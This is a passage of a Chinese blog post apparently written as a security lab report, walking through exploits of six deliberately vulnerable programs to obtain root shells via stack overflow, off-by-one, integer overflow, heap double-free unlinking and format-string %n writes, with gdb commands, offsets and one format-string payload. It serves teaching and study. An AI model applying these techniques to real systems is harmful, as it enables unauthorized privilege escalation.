+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">r</span><br><span class="line">b foo</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+<p>进入调试后，使用<code>catch exec</code>命令，是程序由exploit1通过execve执行vul1时中断，便于调试;执行vul1后，在foo函数下断点，以便找到buf数组起始位置从而判断返回地址;<br>使用指令<code>x/1xw buf</code>可见buf起始地址，使用此地址替换上述的0x00000000：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508202732.png" alt="20240508202732"><br>再次编译，重复上述操作，确认buf起始地址没有发生改变，由此payload构造成功。</p>
+<p>使用<code>gcc exploit1.c -o exploit1 -fno-stack-protector -z execstack</code>编译后执行，成功获取具有root权限的shell：</p>
+<h2 id="漏洞程序二"><a href="#漏洞程序二" class="headerlink" title="漏洞程序二"></a>漏洞程序二</h2><p><strong>2.3.1 漏洞分析</strong></p>
+<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203331.png" alt="20240508203331"></p>
+<p>程序vul2与vul1非常相似，但限制了拷贝的字符串的长度，使得不会出现通过缓冲区溢出直接覆盖返回地址的情况，但其在确认字符串长度时使用了&lt;&#x3D;符号，导致字符串拷贝时可能多复制一个字节，这样我们就可以修改bar栈帧中的old ebp，也就是调用它的foo函数的ebp的最后一个字节。回到foo函数后执行leave指令（相当于mov esp,ebp pop ebp两条指令）时将被修改后的ebp传给esp，若此时esp+4指向shellcode的地址，那么执行ret指令时我们就能成功跳转至shellcode机器码所在位置从而获取shell.<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203425.png" alt="20240508203425"><br>总体过程描述大致如下图<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203404.png" alt="20240508203404"><br><strong>2.3.2 构造payload</strong></p>
+<p>根据上述原理，首先在gdb中调试获取buf的地址：</p>
+<p>调试vul2，使用命令<code>disas foo</code>反汇编foo函数，获取bar函数地址为0x804851a，如图20240508203425所示。<br>构造一个200字节的payload并编译exploit2.c。使用<code>gdb -e exploit2 -s /tmp/vul2</code>联合调试，在bar函数处下断点，打印ebp和buf值</p>
+<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203635.png" alt="20240508203635"><br>调试命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">r</span><br><span class="line">b *0x0804851a</span><br><span class="line">c</span><br><span class="line">p $edp</span><br><span class="line">p &amp;buf</span><br></pre></td></tr></table></figure>
+<p>得到&amp;buf&#x3D;0xbffffcb8,因此获取到buf范围是0xbffffcb8-0xbffffd80共200字节, ebp为0xbffffd8c, 如果覆盖掉ebp最后一字节为00，改变ebp为0xbffffd00，那么ret存放地址应当为0xbffffd04-0xbffffd08，注意是小端存储。D04-cb8&#x3D;4c&#x3D;76字节。<br>编写程序，构造数组：<br>在此过程中曾使用第一种shell构造方法，但实验过程中发现buf数组地址总是发生变化，经查询发现第一种方法通过栈来设置参数，推测可能是使用的栈导致了vul2的内存空间被占用，网上查询到第二种方法，如上文所述存在shellcode.h中，最终程序编写如下</p>
+<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203826.png" alt="20240508203826"><br>编译运行，成功获取具有root的权限的shell。</p>
+<h2 id="漏洞程序三"><a href="#漏洞程序三" class="headerlink" title="漏洞程序三"></a>漏洞程序三</h2><p><strong>2.4.1 漏洞分析</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203931.png" alt="20240508203931"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508203919.png" alt="20240508203919"><br>程序输入为整数count和字符串in。采用了if判断语句来防止溢出，存在的漏洞主要是当count为一个足够小的负数时，可以满足 if 的条件进入memcpy函数，而memcpy接受的内存长度类型为size_t，在32位中即为unsigned int，共计4字节（32位），可以表示的最大值是 2^32 – 1&#x3D;4,294,967,295，其函数原型如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void * memcpy(</span><br><span class="line">    void* _Dst,void const* _Src,size_t _Size</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>当负数足够小时，负数*sizeof(widget_t)可能溢出产生正数。故要对vul3栈溢出攻击只需要构造合适的负数count产生溢出和字符串in覆盖buf，然后覆盖ebp，ret即可。由程序代码可知widget_t结构体占4字节，buf数组占用20*1000&#x3D;20000字节，若count*20&gt;20000即可导致数组越界，因此count的4字节32位二进制中除去第一位符号位为1外剩余位应当&gt;&#x3D;1001&#x3D;0b001111101001，因此传入的count的二进制可为0b 1000 0000 0000 0000 0000 0011 1110 1001，计算机中负数以补码存储，对应为0b 0111 1111 1111 1111 1111 1100 0001 0111，其对应十进制为-2,147,484,649。buf大小为20000字节，故返回地址在20004~20008字节处。覆盖该地址内存为buf的起始地址，然后buf覆盖为shellcode即可。</p>
+<p><strong>2.4.2 构造payload</strong></p>
+<p>类似方法获取buf起始地址为0xbfff61f0,得到buf基址 0xbfffa220<br>编写程序，构造数组：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508204222.png" alt="20240508204222"><br>使用命令<code>gcc -o exploit3 exploit3.c -z execstack -fno-stack-protector</code>编译运行,成功获取具有root权限shell</p>
+<h2 id="漏洞程序四"><a href="#漏洞程序四" class="headerlink" title="漏洞程序四"></a>漏洞程序四</h2><p><strong>2.5.1 漏洞分析</strong></p>
+<p>1、源码及其依赖项分析</p>
+<p>1.1 源码分析<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214646.png" alt="20240508214646"></p>
+<p>由上述代码可见foo函数的执行逻辑顺序为:</p>
+<p>p&#x3D;tmalloc(500) q&#x3D;tmalloc(300) tfree(p) tfree(q) p&#x3D;tmalloc(1024) tfree(q)</p>
+<p>可知为q申请了一次内存但使用tfree了两次，由于申请的内存已经在第一次tfree，第二次tfree会释放一个不存在的空间，导致出错，该漏洞属于堆溢出漏洞。因此，tfree很可能是我们可以利用的地方。</p>
+<p>1.2 库文件“tmalloc.h”对应“tmalloc.c”文件分析：</p>
+<p>分析其结构体与宏定义，可知，CHUNK结构体占8个字节（前4个字节为左指针，后4个字节为右指针，分别指向前后的块位置）在块的r指针的低位部分存储块的状态，1为空闲，0为占用。</p>
+<p>tmalloc函数和tfree函数：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214809.png" alt="20240508214809"><br>可以总结tmalloc函数的执行过程如下：<br>首先，tmalloc 函数接收一个参数 nbytes，表示需要分配的内存大小（以字节为单位）。如果内存分配器尚未初始化（即 bot 为 NULL），则会调用 init() 函数进行初始化。init()函数会把bot（arena数组第一个）设为空闲块，top（arena数组最后一个）设为占用块。然后根据传入的字节数 nbytes 计算需要的以块为单位进行内存分配的内存大小 size。从链表的起始位置 bot 开始，内存分配器遍历空闲块链表，寻找一个大小大于等于 size 的空闲块（当前块为空闲且其右块与当前块之间的空间大于等于size）。如果找到了合适大小的空闲块 p，则将其标记为占用状态（调用 CLR_FREEBIT(p) 函数），表示该块已经被分配出去。如果找到的空闲块大小大于 size，则会创建一个新的空闲块来存放剩余的空间（）（top左指针指向空闲块尾，空闲块尾右指针指向top，空闲块尾左指针指向空闲块首，空闲块首右指针指向空闲块尾）。最后返回分配的内存块的首地址给调用者。</p>
+<p>tfree函数的执行过程如下：<br>首先检查 vp 是否为 NULL，如果是，则直接返回，因为无需释放任何内存。然后使用 TOCHUNK 宏将指针 vp 转换为其对应的内存块头部指针 p。使用 CLR_FREEBIT 宏清除块 p 的空闲位，即将其标记为占用状态。然后尝试合并左空闲块（按图1即向上空闲块合并）：首先获取 p 的左边相邻块 q，如果 q 不为空且是空闲的，则尝试与其合并。使用 CLR_FREEBIT 宏清除块 q 的空闲位。更新合并后的块 q 的右指针指向 p 的右指针所指向的块。更新 p 右指针所指向的块的左指针指向合并后的块 q。使用 SET_FREEBIT 宏设置块 q 的空闲位。更新当前处理的块指针 p 为合并后的块 q。然后尝试向右合并空闲块，原理类似，最后使用 SET_FREEBIT 宏设置块 p 的空闲位，表示该块现在是空闲的。这样，tfree函数完成了对给定内存块的释放，并尝试将其与相邻的空闲块合并，以减少内存碎片化。</p>
+<p>结合vul4.c和tmallo.c，我们可以分析出，第一次为p使用tmalloc申请了500字节，（由于CHUNK数组一个8字节，按块分配内存，实际分配了504字节），然后为q申请了300字节（实际分配304字节，q也就指向第504字节所在地址），然后分别释放申请的空间，此时虽然块被标记为空闲，但实际上p,q仍指向原位置。之后再分配了1024字节给p,因为504+304&lt;1024,因此q也就指向p所分配中某一块的地方，如下所示：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214849.png" alt="20240508214849"></p>
+<p>因此我们就可以给q所指的地方赋值，又根据tfree的原理，第二次释放q时，若我们在赋值q所指的地方时将其左指针设置为我们想要返回的地址，右指针设置为存储返回地址的地址，即foo函数的返回地址存储的地址。需要注意的是，与左节点合并必须满足左节点空闲，即左指针的第 5 位（左指针的右指针的低位，对应下图中q0-&gt;s.r）应该是奇数。当使用tfree时，语句p0s.rs.l&#x3D;q0，也就是相当于将q的右指针所指地址（也就是存储返回地址的地址）的前四字节（即其右指针）替换为q的左指针（也就是设置的返回地址）。</p>
+<p>注意，上文提到的q指的是vul4.c中的q,而q0指的是tmalloc.c中的q,p,p0同理。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508214919.png" alt="20240508214919"></p>
+<p><strong>2.5.2 构造payload</strong></p>
+<p>1、确定shellcode地址（p所指内存地址）；</p>
+<p>反汇编foo函数，在最后一个tfree的汇编代码处下断点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b *0x0804862e</span><br><span class="line">c</span><br><span class="line">p p</span><br></pre></td></tr></table></figure>
+<p>得到指针p指向的内存地址<code>0x804a068</code><br>将shellcode设置为p起始地址偏移32字节处，便于后续操作</p>
+<p>2、确定返回地址所在的内存地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p $ebp</span><br></pre></td></tr></table></figure>
+<p>获得栈底指针寄存器 ebp 的值为<code>0xbffffa4c</code><br>其上四字节即返回地址所在地，即<code>0xbffffa50</code></p>
+<p>3、获取q所指地址0x804a268：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p q</span><br></pre></td></tr></table></figure>
+<p>重新调试，在第三个tmalloc前下断点，可见覆盖前q堆首值:<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215250.png" alt="20240508215250"></p>
+<p>可见其左指针指向p堆的堆首。</p>
+<p>4、构造payload</p>
+<p>上面提到将shellcode设置为p起始地址偏移32字节处，这是因为tfree时与左节点合并必须满足左节点空闲，即左指针的第 5 位（左指针的右指针的低位，对应下图中q0-&gt;s.r）应该是奇数，而shellcode第五位是0x76，不满足。<br>因此我们将q的左指针指向 p 的起始数据区域，同时将其 5~8 个字节赋值为 0xffffffff。但0xffffffff无法对应指令，当从p 的起始数据区域开始执行时到此处会出错，我们可以使用jmp指令跳过这部分区域，jmp指令对应机器码为\xeb，使用\xeb08跳过8字节偏移来跳过这部分。因此最后构造如下payload:<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215323.png" alt="20240508215323"><br>编译运行,成功</p>
+<h2 id="漏洞程序五"><a href="#漏洞程序五" class="headerlink" title="漏洞程序五"></a>漏洞程序五</h2><p><strong>2.6.1 漏洞分析</strong></p>
+<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215336.png" alt="20240508215336"><br>该程序存在由错误使用snprintf函数导致的格式化字符串漏洞，snprintf函数的功能是根据指定的 format 字符串将格式化数据写入到 str 缓冲区中，并根据 size 控制写入的字符数。查看其函数原型，可见，在函数定义中，其恰当的用法应当是当format中包含若干格式化指示符时，其后应该再加相同数量的参数以对应格式化指示符，但原程序中使用snprintf(buf, sizeof buf, arg);时，只有一个参数，且用户可以控制输入的内容，这就可能导致安全性问题。当用户的输入包含格式化字符串控制符时（如 %s、%n 等），snprintf找不到其对应的参数，但它不会意识到这一点，而是会继续尝试从堆栈中读取相应的数据，从而读取到错误的内存数据（越过了它能读取的边界）。恶意用户就可以精心构造输入文件，插入了类似 %x、%s 的格式化字符串，从而导致程序崩溃或者泄漏敏感信息。更严重的情况下，攻击者可能通过 %n 格式化字符串控制符修改内存中的数据，引发潜在的安全问题。<br>在理解程序存在的漏洞之后，我们还需要回顾一些c语言语法，已知：<br>a. 在C语言中可以通过%Ns(d&#x2F;x&#x2F;p&#x2F;f等)来控制输出多少位，例如%2u可以输出2位无符号10进制数，因此使用%133u可以输出133位10进制数。<br>b. 在C99中，%n是一个格式说明符，主要用于 printf 和 sprintf 等函数。它的作用是将到目前为止写入（或读取）的字符数存储到一个 int 类型的变量中。例如语句printf(“aaaaa%n”, &amp;count);printf(“%d\n”, count);的结果是：aaaaa5<br><strong>由此可以总结触发漏洞过程如下：</strong></p>
+<p><em>当构造的输入为</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char payload[400] = </span><br><span class="line"> &quot;\xff\xff\xff\xff\x2c\xdb\xff\xff&quot;</span><br><span class="line"> &quot;%29u%n&quot;;</span><br></pre></td></tr></table></figure>
+<p>时，程序执行到<code>snprintf(buf, sizeof buf, arg); </code>由于实际提供的参数比指示符要求的参数少，snprintf将尝试读取未定义的内存。在这种情况下，snprintf函数会试图读取额外的4字节，这样就读取了0xffff ffff，并将其视为无符号整数来打印, 然后读取到指示符%n时，会再向下读取4字节，即0xffffdb2c，并将其视为需要将输出字符数写入的地址，从而导致了3D被写入到内存0xffff bd2c中。通过这种方法，我们即可实现向任意内存写入数据，假如我们找到了snprintf函数的返回地址，并将其修改为shellcode的起始地址，就能使其返回错误的地址从而成功获取shell</p>
+<p><strong>2.6.2 构造payload</strong></p>
+<p>构造如下输入以调试获取buf及其他数据地址：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215600.png" alt="20240508215600"><br>编译，使用如下命令调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb -e exploit5 -s /tmp/vul4</span><br><span class="line">catch exec</span><br><span class="line">r</span><br><span class="line">b foo</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+<p>使用<code>disas foo，disas snprintf</code>命令反汇编foo snprintf函数，并通过<code>p \$ebp, x/xw buf</code>等指令调试，获取buf起始地址和栈帧结构,并根据以上汇编指令和buf起始地址，可以推断栈帧结构如下：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215741.png" alt="20240508215741"></p>
+<p>可见snprintf()函数的返回地址储存在0xbfffffb2c处，同时，由于以下构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char payload[400] = </span><br><span class="line"> &quot;\xff\xff\xff\xff\x2c\xdb\xff\xff&quot;</span><br><span class="line"> &quot;%29u%n&quot;;</span><br></pre></td></tr></table></figure>
+<p>会不断修改buf中的数值，所以我们不能像前几次一样将返回地址修改为buf数组的地址，而是将其修改为arg数组的地址，通过命令x&#x2F;xw查询到arg数组起始地址为0xbffffe61：<br>同时，由于构造输入的前数十个字节需要用于存储如图1的构造，我们不能将shellcode存储在arg数组起始处，可以存储在+96字节(0xbffffec1)处，并把返回地址设置为+80字节(0xbffffeb1)处（80字节已经足够容纳以上数据，且空余字节通过\x90填充，对应nop指令，不影响程序），从而构造以下payload<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215840.png" alt="20240508215840"></p>
+<p>编译运行，没有出现预期结果，gdb调试，发现增加的c语言语句导致程序地址发生变化，重新构造payload如下<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215914.png" alt="20240508215914"></p>
+<p>编译运行，成功获取具有root权限的shell</p>
+<h2 id="漏洞程序六"><a href="#漏洞程序六" class="headerlink" title="漏洞程序六"></a>漏洞程序六</h2><p><strong>2.7.1 漏洞分析</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215934.png" alt="20240508215934"><br>vul6与vul2类似，也是可能导致一个字节的缓冲区溢出，但在执行foo函数后直接退出（exit(0)），因此无法使用vul2的构造方法，需要设法绕过此函数。exit()函数的汇编代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508215959.png" alt="20240508215959"></p>
+<p>其在执行时第一条指令是jmp指令，若能修改其目标地址，则可跳转至我们想要跳转的地方。<br>由漏洞程序2可知，通过nstrcpy()函数可以修改foo函数ebp的值，而查看汇编代码可知变量p与a的位置是根据ebp决定的因此存在修改指针p指向地址空间的值的可能性。<br>结合vul2推断其栈帧结构大致如下：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220041.png" alt="20240508220041"><br>进一步分析汇编代码，在执行bar()函数后执行*p&#x3D;a时，其对应汇编指令如下：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220200.png" alt="20240508220200"><br>也就相当于将ebp-0x8位置的数据复制到ebp-0x4的位置，若我们修改ebp指向buf数组中某一位置，从而使得ebp-0x8指向buf数组中某一数值，该数值定为jmp指令的目标地址存储的地方,根据上文exit函数反汇编代码可知为0x0804a00c，并使得ebp-0x4指向的地址中存储shellcode的开始地址，最终可以实现使用shellcode的开始地址替换jmp指令的目标地址，从而获取shell.</p>
+<p><strong>2.7.2 构造payload</strong></p>
+<p>根据上述原理，首先获取foo函数ebp和buf起始地址，ebp&#x3D;0xbffffe4c;&amp;buf&#x3D;0xbffffd70<br>若将ebp修改为0xbffffe00,则其与buf起始地址的偏移为0xe00-0xd70&#x3D;144<br>则ebp-0x8对应0xbffffdf8,偏移136，将其设置为buf起始地址0xbffffe00, ebp-0x4对应0xbffffdfc,偏移140,将其设置为0x0804a00c<br>如下构造payload<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220209.png" alt="20240508220209"><br>编译，由于原本获取的是以“hi there”为输入的ebp,buf，因此再次调试获取buf起始地址和ebp&#x3D;0xbffffd8c,&amp;buf&#x3D;0xbffffcb0<br>得到偏移0xd00-0xcb0-0x08 &#x3D;80-8&#x3D;72修改payload，如下：</p>
+<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220326.png" alt="20240508220326"><br>编译运行，成功获取具有root权限shell<br>至此，全部实验成功<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240508220335.png" alt="20240508220335"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="tag"><i class="fa fa-tag"></i> 缓冲区溢出</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/05/05/S-Linux-Note/" rel="prev" title="S-Linux-Note">
+                  <i class="fa fa-angle-left"></i> S-Linux-Note
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/05/11/L-HTML-CSS-Note/" rel="next" title="L-HTML-CSS-Note">
+                  L-HTML-CSS-Note <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  
+  <div class="comments giscus-container">
+  </div>
+  
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Shearington</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">442k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">24:34</span>
+  </span>
+</div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="giscus" type="application/json">{"enable":true,"repo":"Fushiye/Fushiye.github.io","repo_id":"R_kgDOLyiTvA","category":"Announcements","category_id":"DIC_kwDOLyiTvM4CteAo","mapping":"title","strict":0,"reactions_enabled":1,"emit_metadata":0,"theme":"light","lang":"zh-CN","crossorigin":"anonymous","input_position":"top","loading":"lazy"}</script>
+
+<script>
+document.addEventListener('page:loaded', () => {
+  if (!CONFIG.page.comments) return;
+
+  NexT.utils.loadComments('.giscus-container')
+    .then(() => NexT.utils.getScript('https://giscus.app/client.js', {
+      attributes: {
+        async                   : true,
+        crossOrigin             : 'anonymous',
+        'data-repo'             : CONFIG.giscus.repo,
+        'data-repo-id'          : CONFIG.giscus.repo_id,
+        'data-category'         : CONFIG.giscus.category,
+        'data-category-id'      : CONFIG.giscus.category_id,
+        'data-mapping'          : CONFIG.giscus.mapping,
+        'data-strict'           : CONFIG.giscus.strict,
+        'data-reactions-enabled': CONFIG.giscus.reactions_enabled,
+        'data-emit-metadata'    : CONFIG.giscus.emit_metadata,
+        'data-theme'            : CONFIG.giscus.theme,
+        'data-lang'             : CONFIG.giscus.lang,
+        'data-input-position'   : CONFIG.giscus.input_position,
+        'data-loading'          : CONFIG.giscus.loading
+      },
+      parentNode: document.querySelector('.giscus-container')
+    }));
+});
+</script>
+
+</body>
+</html>
